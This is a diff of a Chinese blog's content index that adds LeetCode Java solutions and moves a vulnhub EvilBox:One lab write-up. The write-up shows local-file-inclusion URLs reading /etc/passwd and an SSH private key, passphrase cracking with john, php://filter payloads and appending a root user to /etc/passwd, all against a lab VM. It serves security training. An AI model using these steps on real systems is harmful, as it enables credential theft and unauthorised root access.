-<p>邮箱：<a href="mailto:&#x6b;&#101;&#101;&#107;&#107;&#101;&#x77;&#x79;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;">&#x6b;&#101;&#101;&#107;&#107;&#101;&#x77;&#x79;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;</a></p>
+<p>邮箱：<a href="mailto:&#107;&#101;&#101;&#107;&#107;&#x65;&#119;&#121;&#64;&#113;&#113;&#46;&#99;&#x6f;&#x6d;">&#107;&#101;&#101;&#107;&#107;&#x65;&#119;&#121;&#64;&#113;&#113;&#46;&#99;&#x6f;&#x6d;</a></p>
 <p>2022年10月19日</p>
 <p>靶机链接：</p>
 </blockquote>
@@ -1382,7 +1382,8 @@
   <entry>
     <title>【刷题】面试经典 150 题</title>
     <url>/leetcode-top-interview-150/</url>
-    <content><![CDATA[<h2 id="1-数组-x2F-字符串"><a href="#1-数组-x2F-字符串" class="headerlink" title="1 数组 &#x2F; 字符串"></a>1 数组 &#x2F; 字符串</h2><h3 id="88-合并两个有序数组"><a href="#88-合并两个有序数组" class="headerlink" title="88. 合并两个有序数组"></a><a href="https://leetcode.cn/problems/merge-sorted-array/">88. 合并两个有序数组</a></h3><p>给你两个按 <strong>非递减顺序</strong> 排列的整数数组 <code>nums1</code> 和 <code>nums2</code>，另有两个整数 <code>m</code> 和 <code>n</code> ，分别表示 <code>nums1</code> 和 <code>nums2</code> 中的元素数目。</p>
+    <content><![CDATA[<h2 id="复习计划"><a href="#复习计划" class="headerlink" title="复习计划"></a>复习计划</h2><p><a href="#169-%E5%A4%9A%E6%95%B0%E5%85%83%E7%B4%A0">169. 多数元素</a> 摩尔投票法</p>
+<h2 id="1-数组-x2F-字符串"><a href="#1-数组-x2F-字符串" class="headerlink" title="1 数组 &#x2F; 字符串"></a>1 数组 &#x2F; 字符串</h2><h3 id="88-合并两个有序数组"><a href="#88-合并两个有序数组" class="headerlink" title="88. 合并两个有序数组"></a><a href="https://leetcode.cn/problems/merge-sorted-array/">88. 合并两个有序数组</a></h3><p>给你两个按 <strong>非递减顺序</strong> 排列的整数数组 <code>nums1</code> 和 <code>nums2</code>，另有两个整数 <code>m</code> 和 <code>n</code> ，分别表示 <code>nums1</code> 和 <code>nums2</code> 中的元素数目。</p>
 <p>请你 <strong>合并</strong> <code>nums2</code> 到 <code>nums1</code> 中，使合并后的数组同样按 <strong>非递减顺序</strong> 排列。</p>
 <p><strong>注意：</strong>最终，合并后数组不应由函数返回，而是存储在数组 <code>nums1</code> 中。为了应对这种情况，<code>nums1</code> 的初始长度为 <code>m + n</code>，其中前 <code>m</code> 个元素表示应合并的元素，后 <code>n</code> 个元素为 <code>0</code> ，应忽略。<code>nums2</code> 的长度为 <code>n</code> 。</p>
 <p><strong>示例 1：</strong></p>
@@ -1494,7 +1495,10 @@
 <li><code>-109 &lt;= nums[i] &lt;= 109</code></li>
 </ul>
 <p><strong>进阶：</strong>尝试设计时间复杂度为 O(n)、空间复杂度为 O(1) 的算法解决此问题。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>参考：<a href="https://leetcode.cn/problems/majority-element/solutions/2362000/169-duo-shu-yuan-su-mo-er-tou-piao-qing-ledrh/">多数元素（摩尔投票，清晰图解）</a>（by Krahets）</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 哈希统计法</span></span><br><span class="line"><span class="comment"> * 时间复杂度：O(n)</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(n)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> map.getOrDefault(num, <span class="number">0</span>);</span><br><span class="line">            count++;</span><br><span class="line">            map.put(num, count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> nums.length / <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer num : map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(num) &gt; target) &#123;</span><br><span class="line">                res = num;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 排序取中间元素（快速排序实现）</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(n * log n)</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(log n)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Sort.quickSort(nums);</span><br><span class="line">        <span class="keyword">return</span> nums[nums.length / <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 摩尔投票法，</span></span><br><span class="line"><span class="comment"> * 注意题目中不是求一般的众数，而是限定出现次数大于一半的数！</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(n)</span></span><br><span class="line"><span class="comment"> * 时间复杂度：O(1)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>, votes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (votes == <span class="number">0</span>) x = num;</span><br><span class="line">            votes += num == x ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h3 id="189-轮转数组"><a href="#189-轮转数组" class="headerlink" title="189. 轮转数组"></a><a href="https://leetcode.cn/problems/rotate-array/">189. 轮转数组</a></h3><p>给定一个整数数组 <code>nums</code>，将数组中的元素向右轮转 <code>k</code> 个位置，其中 <code>k</code> 是非负数。</p>
@@ -2164,7 +2168,7 @@
     <url>/vulnhub-Cereal/</url>
     <content><![CDATA[<blockquote>
 <p>网络攻防实战 第十次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#x65;&#x65;&#x6b;&#107;&#101;&#119;&#121;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;">&#x6b;&#x65;&#x65;&#x6b;&#107;&#101;&#119;&#121;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;</a></p>
+<p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#x6b;&#x6b;&#101;&#119;&#x79;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;">&#x6b;&#x65;&#101;&#x6b;&#x6b;&#101;&#119;&#x79;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;</a></p>
 <p>2022年11月26日</p>
 <p>靶机链接：<a href="https://vulnhub.com/entry/cereal-1,703/">https://vulnhub.com/entry/cereal-1,703/</a></p>
 </blockquote>
@@ -2421,263 +2425,11 @@
       </tags>
   </entry>
   <entry>
-    <title>【渗透测试】第八周 vulnhub-EvilBox:One</title>
-    <url>/vulnhub-EvilBoxOne/</url>
-    <content><![CDATA[<blockquote>
-<p>网络攻防实战 第八次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#x65;&#x65;&#x6b;&#107;&#101;&#x77;&#x79;&#64;&#x71;&#x71;&#x2e;&#x63;&#111;&#109;">&#x6b;&#x65;&#x65;&#x6b;&#107;&#101;&#x77;&#x79;&#64;&#x71;&#x71;&#x2e;&#x63;&#111;&#109;</a></p>
-<p>2022年11月8日</p>
-<p>靶机链接：<a href="https://vulnhub.com/entry/evilbox-one,736/">https://vulnhub.com/entry/evilbox-one,736/</a></p>
-</blockquote>
-<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>取得目标靶机的 root 权限并获得两个 flag。</p>
-<p>我们将使用到以下攻击手段：</p>
-<ul>
-<li>主机发现、端口扫描</li>
-<li>隐藏路径爆破</li>
-<li>参数名爆破</li>
-<li>文件包含漏洞的发现以及利用</li>
-<li>SSH 登入</li>
-<li>私钥密码爆破</li>
-<li>特定权限文件的发现</li>
-<li>添加自定义用户记录</li>
-</ul>
-<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
-<p>kali: 10.0.2.15</p>
-<p>靶机: 10.0.2.12</p>
-</blockquote>
-<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
-<li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.12 -A</span></span><br></pre></td></tr></table></figure>
-
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211601033.png" alt="image-20221108211601033" />  
-</li>
-<li><p>访问80端口发现是一个 <code>Apache2 Debian</code> 的默认页面，没有对渗透有帮助的信息：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211801201.png" alt="image-20221108211801201"  /></li>
-</ol>
-<h3 id="0x01-隐藏路径爆破"><a href="#0x01-隐藏路径爆破" class="headerlink" title="0x01. 隐藏路径爆破"></a>0x01. 隐藏路径爆破</h3><ol>
-<li><p>首先使用 <code>dirsearch</code> 进行路径爆破：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108212228720.png" alt="image-20221108212228720" /> 
-
-<p>找到了隐藏路径 <code>/secret/</code> 和隐藏文件 <code>robots.txt</code>。</p>
-<p>分别访问均没有获得有效信息。</p>
-<p>ps：<a href="https://blog.csdn.net/qq_41092170/article/details/117701816">robots.txt</a></p>
-</li>
-<li><p>对 <code>/secret/</code> 做进一步路径爆破：</p>
-<p>直接使用 <code>dirsearch</code> 由于字典限制无法找到更多信息，此处使用 <code>gobuster</code> 进行爆破。</p>
-<blockquote>
-<p>安装：apt install gobuster</p>
-<p>安装字典：apt install seclists</p>
-<p>渗透测试要尝试掌握多种工具</p>
-</blockquote>
-<p>使用指定字典进行路径爆破：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gobuster <span class="built_in">dir</span> -u http://10.0.2.12/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span></span><br></pre></td></tr></table></figure>
-
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108213853527.png" alt="image-20221108213853527" />  
-
-<p>除了主页文件之外，还发现一个 PHP 文件 <code>evil.php</code>。直接通过 url 访问该文件发现只有一个空白页面，猜测可能需要通过 <code>GET</code> 方法提供一个参数（即在 url 后添加某个参数）。</p>
-</li>
-</ol>
-<h3 id="0x02-参数名爆破"><a href="#0x02-参数名爆破" class="headerlink" title="0x02. 参数名爆破"></a>0x02. 参数名爆破</h3><p>使用 <code>ffuf</code> 工具对该参数键值对（参数名和对应的值）进行爆破：</p>
-<ol>
-<li><p>首先期望存在命令注入漏洞：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=<span class="built_in">ls</span> -fs 0</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
-<li>命令 <code>ls</code> 作为参数值。</li>
-</ul>
-<p>进行爆破后，为获得有效结果，爆破失败。</p>
-</li>
-<li><p>期望存在文件包含漏洞：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=../index.html -fs 0</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
-<li>已知存在的主页文件的路径作为参数值。</li>
-</ul>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225352732.png" alt="image-20221108225352732" /> 
-
-<p>爆破成功，结果显示需要提供的参数名为 <code>command</code> 。</p>
-</li>
-<li><p>查看靶机文件验证漏洞存在：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>查看返回页面源码：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225808433.png" alt="image-20221108225808433" width=300% /> 
-
-<p>读取了靶机上的 <code>/etc/passwd</code> 文件，确认存在文件包含漏洞。</p>
-</li>
-</ol>
-<h3 id="0x03-SSH-私钥密码爆破"><a href="#0x03-SSH-私钥密码爆破" class="headerlink" title="0x03. SSH 私钥密码爆破"></a>0x03. SSH 私钥密码爆破</h3><ol>
-<li><p>通过分析上述文件内容，发现靶机中除 root 用户外还存在一个 <code>mowree</code> 用户拥有登录权限，其主目录为 <code>/home/mowree</code>.尝试获取其被允许的 SSH 登录方式：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh mowree@10.0.2.12 -v    <span class="comment"># debug模式</span></span></span><br></pre></td></tr></table></figure>
-
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109091744345.png" alt="image-20221109091744345" width=300% />
-
-<p>发现除了允许输入对应密码登录外还可以使用密钥登录。</p>
-</li>
-<li><p>通过文件包含漏洞查看靶机上该用户的私钥：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
-
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109092317615.png" alt="image-20221109092317615" width=300% /> 
-
-<p>将其保存在文件 <code>id_rsa</code> 中。 </p>
-</li>
-<li><p>使用指定私钥登录靶机：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ssh mowree@10.0.2.12 -i id_rsa</span><br></pre></td></tr></table></figure>
-
-<p>发现需要输入私钥的密码：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093513763.png" alt="image-20221109093513763" /> 
-
-<p>考虑对其进行爆破。  </p>
-<p>如果出现报错：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093055156.png" alt="image-20221109093055156" /> 
-
-<p>这是说密钥文件权限不能为0644，0644权限太开放了，要求你的密钥文件不能被其它用户读取。</p>
-<p>修改权限为7000即可：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 7000 id_rsa</span></span><br></pre></td></tr></table></figure>
-
-<p>参考：<a href="https://blog.csdn.net/Figure_hb/article/details/90754146">https://blog.csdn.net/Figure_hb/article/details/90754146</a></p>
-</li>
-<li><p>将密钥文件转换为 <code>john</code> 可用的 hash 文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /usr/share/john/ssh2john.py ./id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用 <code>john</code> 进行爆破：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">john id_rsa.hash --wordlist=rockyou.txt</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>该字典文件可通过在 kali 上使用 locate 指令搜索得到</p>
-</blockquote>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109094836969.png" alt="image-20221109094836969" /> 
-
-<p>成功获取私钥密码 <code>unicorn</code>。</p>
-</li>
-<li><p>成功登入靶机：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109095933335.png" alt="image-20221109095933335" /></li>
-</ol>
-<h3 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04. 信息收集"></a>0x04. 信息收集</h3><ol>
-<li><p>查看当前目录下的文件，获取第一个 Flag：</p>
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109100516303.png" alt="image-20221109100516303" /> 
-
-<p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
-</li>
-<li><p>当前用户路径下没有其他有价值的文件，在靶机上寻找用户可以写入的文件：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -perm -o+w -maxdepth 3 -<span class="built_in">print</span> | grep -v /dev| grep -v /sys | grep -v /proc | grep -v /boot | grep -v /run &gt; res.txt</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>find指令的使用：<a href="https://blog.csdn.net/m0_46674735/article/details/112390027">https://blog.csdn.net/m0_46674735/article/details/112390027</a></p>
-<p>使用find命令按权限查找文件：<a href="https://www.iplayio.cn/post/596968725">https://www.iplayio.cn/post/596968725</a></p>
-</blockquote>
-<ul>
-<li><p>-o+w：查找其他用户有写权限的文件，（由于期望目标文件所有者是 root，我们目前的用户相对 root 即为 other users）；</p>
-</li>
-<li><p>-maxdepth：从根目录开始搜索的最大深度为3；</p>
-</li>
-<li><p>-print：将输出结果写入标准输出文件；</p>
-</li>
-<li><p>grep -v &#x2F;dev| grep -v &#x2F;sys | grep -v &#x2F;proc | grep -v &#x2F;boot | grep -v &#x2F;run：</p>
-<p>忽略以上目录下的搜索结果；</p>
-</li>
-<li><p>&gt; res.txt：将标准输出重定向为 res.txt 文件，即将筛选后的搜索结果保存在该文件中。</p>
-</li>
-</ul>
-<p>查看搜索结果，发现 <code>/etc/passwd</code> 文件竟然可以被其他用户写入：</p>
-<body style="text-align:left">
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173321185.png" alt="image-20221109173321185" width=700/>
-</body>
-</li>
-<li><p>进一步验证：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> /etc/passwd -al</span></span><br></pre></td></tr></table></figure>
-
-<body style="text-align:left">
-<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173503185.png" alt="image-20221109173503185" width=700 />
-</body>
-
-<p>发现我们确实具有写权限。</p>
-<p>设想如果我们在其中插入一条具有 root 权限的密码自定义的用户记录，切换到我们自定义的用户即可获取 root 权限。</p>
-</li>
-</ol>
-<h3 id="0x05-自定义-root-用户"><a href="#0x05-自定义-root-用户" class="headerlink" title="0x05. 自定义 root 用户"></a>0x05. 自定义 root 用户</h3><ol>
-<li><p>首先需要在 kali 上对我们自定义的密码进行加密。使用工具 <code>openssl</code>：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">openssl passwd</span></span><br></pre></td></tr></table></figure>
-
-<p>这里我输入的明文密码为 <code>test123</code>。<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109180626629.png" alt="image-20221109180626629"> </p>
-</li>
-<li><p>使用得到的密码密文，参照 passwd 文件中 root 用户的记录自定义一条用户记录：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>将该记录追加在 <code>/etc/passwd</code> 文件中：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>切换到用户 <code>test123</code>：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su test123</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"> </p>
-<p>成功提权。</p>
-</li>
-<li><p>切换到 root 目录，发现第二个 Flag：</p>
-<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181455730.png" alt="image-20221109181455730"> </p>
-<p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
-</li>
-</ol>
-<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><ul>
-<li><p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
-</li>
-<li><p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
-</li>
-<li><p><strong>root：</strong></p>
-<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"></p>
-</li>
-</ul>
-<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
-<li>根据发现的端口首先通过浏览器访问靶机的80端口，发现没有有效信息，考虑隐藏路径爆破；</li>
-<li>使用 <code>dirsearch</code> 爆破到存在 <code>/secret/</code> 路径，但是继续爆破无果。换用 <code>gobuster</code> 进行路径爆破，最终找到一个 PHP 文件 <code>evil.php</code>；</li>
-<li>直接访问返回空白页，推测其可能需要一个参数，使用 <code>ffuf</code> 进行参数名的爆破，最终发现存在文件包含漏洞；</li>
-<li>通过文件包含漏洞查看文件 <code>/etc/passwd</code>，发现一个可以登录的用户 <code>mowree</code>。使用 ssh 尝试登录发现该用户还支持私钥认证登录；</li>
-<li>通过文件包含漏洞获取靶机对应路径下的私钥，并使用 <code>john</code> 对私钥密码进行爆破；</li>
-<li>成功登入靶机后，发现当前用户对 <code>/etc/passwd</code> 文件具有写权限，添加一个具有 root 身份的密码自定义的用户记录；</li>
-<li>使用我们自定义的密码切换至上述自定义用户，成功获取 root 权限。</li>
-</ul>
-<h2 id="五、思路拓展"><a href="#五、思路拓展" class="headerlink" title="五、思路拓展"></a>五、思路拓展</h2><ol>
-<li><p>对于一个文件包含漏洞，可以首先尝试有没有远程文件包含漏洞，如果有即可让其执行 kali 的 web 服务上的一句话木马或反弹 shell 等攻击脚本。（本次实验中不存在该漏洞）</p>
-</li>
-<li><p>也可以考虑先编码，再通过文件包含漏洞读出编码后的 PHP 代码，可以实现避免执行代码而是读取代码的内容。这里可以尝试将 <code>evil.php</code> 读出：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==</code></li>
-</ul>
-</li>
-<li><p>通过 <a href="https://icyberchef.com/">icyberchef</a> 进行解码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>成功获取到 <code>evil.php</code> 的源码。</p>
-</li>
-<li><p>尝试进行写入，如果成功则可以通过此漏洞写入一句话木马脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/write=convert.base64-</span><br><span class="line">decode/resource=test.php&amp;txt=MTIz</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>尝试访问预期生成的文件，发现返回404，说明该方法在当前靶机上不可用。但也是一种漏洞利用的好思路。</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络攻防实战</category>
-      </categories>
-      <tags>
-        <tag>学习</tag>
-        <tag>Kali</tag>
-        <tag>网络</tag>
-        <tag>安全</tag>
-        <tag>Linux</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【渗透测试】第七周 vulnhub-Fawkes</title>
     <url>/vulnhub-Fawkes/</url>
     <content><![CDATA[<blockquote>
 <p>网络攻防实战 第七次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#107;&#107;&#x65;&#x77;&#x79;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#109;">&#x6b;&#x65;&#101;&#107;&#107;&#x65;&#x77;&#x79;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#109;</a></p>
+<p>邮箱：<a href="mailto:&#107;&#101;&#101;&#107;&#107;&#101;&#x77;&#121;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;">&#107;&#101;&#101;&#107;&#107;&#101;&#x77;&#121;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;</a></p>
 <p>2022年11月2日</p>
 <p>靶机连接：<a href="https://vulnhub.com/entry/harrypotter-fawkes,686/">https://vulnhub.com/entry/harrypotter-fawkes,686/</a></p>
 </blockquote>
@@ -3094,11 +2846,469 @@
       </tags>
   </entry>
   <entry>
+    <title>【渗透测试】第八周 vulnhub-EvilBox:One</title>
+    <url>/vulnhub-EvilBoxOne/</url>
+    <content><![CDATA[<blockquote>
+<p>网络攻防实战 第八次实验</p>
+<p>邮箱：<a href="mailto:&#107;&#101;&#x65;&#107;&#x6b;&#101;&#x77;&#121;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#107;&#101;&#x65;&#107;&#x6b;&#101;&#x77;&#121;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;</a></p>
+<p>2022年11月8日</p>
+<p>靶机链接：<a href="https://vulnhub.com/entry/evilbox-one,736/">https://vulnhub.com/entry/evilbox-one,736/</a></p>
+</blockquote>
+<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>取得目标靶机的 root 权限并获得两个 flag。</p>
+<p>我们将使用到以下攻击手段：</p>
+<ul>
+<li>主机发现、端口扫描</li>
+<li>隐藏路径爆破</li>
+<li>参数名爆破</li>
+<li>文件包含漏洞的发现以及利用</li>
+<li>SSH 登入</li>
+<li>私钥密码爆破</li>
+<li>特定权限文件的发现</li>
+<li>添加自定义用户记录</li>
+</ul>
+<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
+<p>kali: 10.0.2.15</p>
+<p>靶机: 10.0.2.12</p>
+</blockquote>
+<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
+<li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.12 -A</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211601033.png" alt="image-20221108211601033" />  
+</li>
+<li><p>访问80端口发现是一个 <code>Apache2 Debian</code> 的默认页面，没有对渗透有帮助的信息：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108211801201.png" alt="image-20221108211801201"  /></li>
+</ol>
+<h3 id="0x01-隐藏路径爆破"><a href="#0x01-隐藏路径爆破" class="headerlink" title="0x01. 隐藏路径爆破"></a>0x01. 隐藏路径爆破</h3><ol>
+<li><p>首先使用 <code>dirsearch</code> 进行路径爆破：</p>
